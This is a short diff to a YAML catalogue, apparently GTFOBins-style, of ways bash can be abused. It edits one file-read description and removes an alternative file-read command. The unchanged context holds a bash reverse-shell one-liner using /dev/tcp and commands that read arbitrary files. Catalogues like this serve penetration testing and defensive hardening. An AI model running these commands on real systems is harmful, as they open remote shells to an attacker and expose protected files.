@@ -41,14 +41,10 @@ functions:
         export RPORT=12345
         bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
   file-read:
-    - description: It trims trailing newlines.
+    - description: It trims trailing newlines and it's not binary-safe.
       code: |
         export LFILE=file_to_read
         bash -c 'echo "$(<$LFILE)"'
-    - description: It trims trailing newlines.
-      code: |
-        export LFILE=file_to_read
-        bash -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
   file-write:
     - code: |
         export LFILE=file_to_write
